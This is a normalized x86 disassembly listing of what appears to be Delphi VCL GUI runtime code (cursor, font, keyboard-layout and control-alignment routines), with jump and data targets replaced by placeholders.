push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cde4
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4543bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_452724
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_43c5dc
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43db40
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43c5f0
or ecx 0xffffffff
mov dl 0x1
call sub_437a00
pop esi
pop ebx
retn
sub_454454
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43d254
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43850c
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_436cf8
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403430
sub_4544ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4372cc
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40405c
mov eax [ ebp - 0x4 ]
call sub_40422c
push eax
mov eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4372dc
mov eax [ ebp - 0x4 ]
call sub_40422c
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_437388
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_450354
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045b8
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_454598
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43cfd4
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43c5dc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43c5f0
mov dl [ ebx + 0x57 ]
call sub_437278
inc edi
dec esi
jne r-xdata
sub_45463c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45466c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45469c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4191e0
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454a40
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_454a4c
mov eax ebx
call sub_454a58
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_450e74
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c064
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_454e78
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d54
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d54
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_454d54
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4547f4
push ebx
push esi
push edi
push ebp
call sub_4035a8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403234
mov eax [ ebp + 0x88 ]
call sub_403234
mov eax [ ebp + 0x84 ]
call sub_403234
mov eax [ ebp + 0x54 ]
call sub_403234
mov eax [ ebp + 0x50 ]
call sub_403234
mov eax [ ebp + 0x4c ]
call sub_403234
mov eax [ ebp + 0x30 ]
call sub_403234
mov eax [ ebp + 0x34 ]
call sub_403234
mov eax [ ebp + 0x7c ]
call sub_403234
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403234
mov eax ebp
call sub_454ab4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41922c
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403590
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413840
call sub_403234
inc edi
dec esi
jne r-xdata
sub_45496c
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4549b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4136e4
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4136e4
mov eax [ rw-data ]
call sub_457744
sub_4549f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413984
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413984
mov eax [ rw-data ]
call sub_457744
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43f0f8
sub_454a58
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_454b10
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_454ab4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_454b10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_454b38
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454cea
lea eax [ ebp - 0x260 ]
call sub_403f6c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403f6c
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_4153d0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_4089a0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44285c
test al al
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041dc
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4041dc
sub_454d54
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_4575b4
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457368
mov dl 0x1
mov eax [ rw-data ]
call sub_457368
sub_454dc0
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_454de8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_454dc0
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406864
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_4067ec
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_454e78
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457368
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c3f4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c3f4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c4d8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c3f4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c3f4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c3f4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_457368
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c238
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c238
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454fc4
cmp [ rw-data ] 0x0
je r-xdata
sub_454ffc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45505c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_455198 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45520c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_454964
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_413840
mov dl [ ebp - 0x1 ]
call sub_45505c
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_454950
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4136e4
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4138bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_413840
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_454ffc
test al al
je r-xdata
inc esi
sub_455358
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_454964
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_454950
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_4553b0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_455358
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45520c
pop ecx
push ebp
mov al 0x2
call sub_45520c
pop ecx
push ebp
mov al 0x3
call sub_45520c
pop ecx
push ebp
mov al 0x4
call sub_45520c
pop ecx
push ebp
mov al 0x5
call sub_45520c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_455438
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454fcc
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4553b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_454fd4
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4554cc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f6c
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fc0
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_455524
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4036bc#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_457970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_455578
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_435bd0
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4579ec
sub_4555d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_456a8c
sub_455618
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
